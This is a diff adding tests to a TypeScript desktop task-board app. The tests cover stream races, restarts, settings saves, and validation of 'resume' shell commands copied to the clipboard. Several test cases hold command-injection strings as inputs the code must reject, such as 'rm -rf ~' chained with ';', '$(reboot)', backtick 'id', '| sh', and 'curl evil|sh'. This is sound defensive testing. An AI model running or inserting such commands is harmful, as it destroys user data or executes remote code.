@@ -16,6 +16,7 @@ import {
   asBoardProject,
   asBoardTask,
   asTaskWatchEvent,
+  RESUME_COMMAND,
   listTasks,
   watchTasks,
   type TaskWatchEvent,
@@ -26,6 +27,7 @@ import {
   BOARD_HEALTHY_MS,
   BOARD_WATCHDOG_MS,
   TaskBoard,
+  saveBoardSettings,
   type TaskBoardDeps,
 } from '../src/main/taskBoard.js';
 import {
@@ -484,6 +486,126 @@ describe('TaskBoard — the stream is supervised', () => {
   });
 });
 
+describe('TaskBoard — races and restarts', () => {
+  it('a refresh that raced the stream does not discard the snapshots applied meanwhile', async () => {
+    let release: (projects: BoardProject[]) => void = () => undefined;
+    const h = harness({
+      list: () =>
+        new Promise((resolve) => {
+          release = (projects) =>
+            resolve({ ok: true, outcome: 'success', data: { projects }, command: 'devteam tasks list', durationMs: 1 });
+        }),
+    });
+    await h.board.start();
+    h.emit(snap(boardProject({ project_id: 'old' })));
+    h.emit({ event: 'ready' });
+    const pending = h.board.refresh();
+    h.emit(snap(boardProject({ project_id: 'newer' })));
+    release([boardProject({ project_id: 'stale-list' })]);
+    const feed = await pending;
+    expect(feed.projects.map((p) => p.project_id).sort()).toEqual(['newer', 'old']);
+  });
+
+  it('keeps the live status and the data across a restart instead of flashing "starting"', async () => {
+    const h = harness();
+    await h.board.start();
+    h.emit(snap(boardProject({ project_id: 'a' })));
+    h.emit({ event: 'ready' });
+    const before = h.feeds.length;
+    await h.board.restart();
+    expect(h.streams).toHaveLength(2);
+    expect(h.board.snapshot().status).toBe('live');
+    expect(h.board.snapshot().projects).toHaveLength(1);
+    expect(h.feeds.slice(before).every((feed) => feed.status !== 'starting')).toBe(true);
+  });
+
+  it('a disposed board never spawns again: not on restart, not on start', async () => {
+    const h = harness();
+    await h.board.start();
+    h.board.dispose();
+    expect(h.streams[0]?.stop).toHaveBeenCalled();
+    await h.board.restart();
+    await h.board.start();
+    expect(h.streams).toHaveLength(1);
+  });
+});
+
+describe('saveBoardSettings', () => {
+  function store(previous: { staleAfterMinutes: number; doneRetentionDays: number }) {
+    let current = previous;
+    const restart = vi.fn();
+    return {
+      restart,
+      io: {
+        read: () => Promise.resolve(current),
+        write: (next: typeof previous) => {
+          current = next;
+          return Promise.resolve();
+        },
+        restartStream: restart,
+      },
+    };
+  }
+
+  it('restarts the stream only when the stale threshold changed', async () => {
+    const changed = store({ staleAfterMinutes: 60, doneRetentionDays: 7 });
+    await saveBoardSettings(changed.io, { staleAfterMinutes: 30, doneRetentionDays: 7 });
+    expect(changed.restart).toHaveBeenCalledTimes(1);
+  });
+
+  it('leaves the stream alone on a retention-only save, and returns what was stored', async () => {
+    const retention = store({ staleAfterMinutes: 60, doneRetentionDays: 7 });
+    const saved = await saveBoardSettings(retention.io, { staleAfterMinutes: 60, doneRetentionDays: 14 });
+    expect(retention.restart).not.toHaveBeenCalled();
+    expect(saved).toEqual({ staleAfterMinutes: 60, doneRetentionDays: 14 });
+  });
+});
+
+describe('RESUME_COMMAND', () => {
+  const shlexQuote = (value: string) =>
+    /^[\w@%+=:,./-]+$/.test(value) ? value : `'${value.replace(/'/g, `'"'"'`)}'`;
+  const command = (root: string, id: string) => `cd ${shlexQuote(root)} && claude --resume ${shlexQuote(id)}`;
+
+  it('accepts what shlex.quote writes, including a path with a space and an embedded quote', () => {
+    for (const each of [
+      command('/repo/storefront', 'session-aaaaaaaa'),
+      command('/My Projects/shop', 'abc'),
+      command("/o'brien/shop", 'abc'),
+      command('/repo', "it's"),
+      "cd '/r' && codex resume 's1'",
+      "cd /r && opencode --session ses_1",
+    ]) {
+      expect(RESUME_COMMAND.test(each), each).toBe(true);
+    }
+  });
+
+  it('rejects an operand that is not a single shell-safe token', () => {
+    for (const each of [
+      'cd /a; rm -rf ~ && claude --resume x',
+      'cd /a && claude --resume x; rm -rf ~',
+      'cd /a && claude --resume $(reboot)',
+      'cd /a && claude --resume `id`',
+      'cd /a b && claude --resume x',
+      "cd '/a'; rm -rf ~ && claude --resume 'x'",
+      "cd '/a' && claude --resume 'x' && rm -rf ~",
+      "cd '/a\nb' && claude --resume 'x'",
+      "cd /a && claude --resume x | sh",
+      "cd '/a' && claude --resume 'x'y'z'",
+    ]) {
+      expect(RESUME_COMMAND.test(each), each).toBe(false);
+    }
+  });
+
+  it('asBoardSession nulls a hostile resume command and keeps a real one', () => {
+    const hostile = { ...JSON.parse(JSON.stringify(boardSession())), resume_command: 'cd /a; rm -rf ~ && claude --resume x' };
+    const real = { ...JSON.parse(JSON.stringify(boardSession())), resume_command: command("/o'b", 'abc') };
+    const parse = (session: unknown) =>
+      asBoardProject({ ...JSON.parse(JSON.stringify(boardProject())), sessions: [session] });
+    expect((parse(hostile) as BoardProject).sessions[0]?.resume_command).toBeNull();
+    expect((parse(real) as BoardProject).sessions[0]?.resume_command).toBe(command("/o'b", 'abc'));
+  });
+});
+
 // ── IPC ───────────────────────────────────────────────────────────────────────
 
 type Handler = (...args: unknown[]) => unknown;
@@ -579,6 +701,46 @@ describe('task board IPC', () => {
       settings: { staleAfterMinutes: 30, doneRetentionDays: 14 },
     });
     expect(save).toHaveBeenCalledWith({ staleAfterMinutes: 30, doneRetentionDays: 14 });
+  });
+
+  it('refuses control characters and overlong ids at the handler, and copies nothing', async () => {
+    const { handlers, registerTaskBoardIpc, CHANNELS } = await loadIpc();
+    const d = deps();
+    registerTaskBoardIpc(d);
+    const copy = handlers.get(CHANNELS.copyResumeCommand)!;
+    for (const bad of [
+      { projectId: 'proj-a', sessionId: 's1\u0000' },
+      { projectId: 'proj-a\r\n', sessionId: 's1' },
+      { projectId: 'proj-a', sessionId: 's'.repeat(513) },
+      { projectId: 'p'.repeat(600), sessionId: 's1' },
+    ]) {
+      expect(copy({}, bad), JSON.stringify(bad).slice(0, 60)).toMatchObject({ copied: false });
+    }
+    expect(d.copied).toEqual([]);
+  });
+
+  it('puts only the CLI’s string on the clipboard, never anything the renderer sent', async () => {
+    const { handlers, registerTaskBoardIpc, CHANNELS } = await loadIpc();
+    const d = deps();
+    registerTaskBoardIpc(d);
+    const answer = handlers.get(CHANNELS.copyResumeCommand)!({}, { projectId: 'proj-a', sessionId: 's1', text: 'curl evil|sh' });
+    expect(answer).toMatchObject({ copied: true });
+    expect(d.copied).toEqual(["cd '/r' && claude --resume 's1'"]);
+  });
+
+  it('setBoardSettings answers ok:false when the save throws synchronously too', async () => {
+    const { handlers, registerTaskBoardIpc, CHANNELS } = await loadIpc();
+    registerTaskBoardIpc(
+      deps({
+        saveBoardSettings: () => {
+          throw new Error('read-only volume');
+        },
+      }),
+    );
+    expect(await handlers.get(CHANNELS.setBoardSettings)!({}, { staleAfterMinutes: 30, doneRetentionDays: 14 })).toMatchObject({
+      ok: false,
+      message: expect.stringMatching(/read-only volume/),
+    });
   });
 
   it('reports a failed save as a problem, not a throw', async () => {
